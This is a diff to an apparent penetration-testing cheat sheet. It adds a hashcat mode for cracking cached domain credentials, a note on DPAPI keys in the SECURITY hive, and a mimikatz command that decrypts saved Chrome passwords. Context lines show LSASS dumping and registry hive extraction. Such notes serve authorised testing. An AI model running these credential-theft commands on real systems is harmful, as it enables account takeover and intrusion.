@@ -928,6 +928,7 @@ $ hashcat -m 1000 ntlm-hashes.txt <wordlist>
 $ hashcat -m 1000 <ntlm-hash> <wordlist> --show
 $ hashcat -m 1800 -a 0 unshadowed.txt <wordlist> -o /tmp/unshadowed.cracked
 $ hashcat -m 500 -a 0 md5-hashes.txt <wordlist>
+$ hashcat -m 2100 -a 0 <dcc2-hash> <wordlist>
 $ hashcat -m 22100 bitlocker-hashes.txt <wordlist> -o backup.cracked
 ```
 
@@ -970,7 +971,7 @@ PS C:\> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 C:\> reg.exe save hklm\sam C:\sam.save
 C:\> reg.exe save hklm\system C:\system.save
 
-# If we want cached domain user credentials
+# If we want cached domain user credentials and machine and user keys for DPAPI
 C:\> reg.exe save hklm\security C:\security.save
 ```
 
@@ -1069,6 +1070,13 @@ $ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 ```
 $ python3.9 firefox_decrypt.py
+```
+
+- DPAPI
+
+```
+C:\> mimikatz.exe
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
 
 #8. - File Transfers
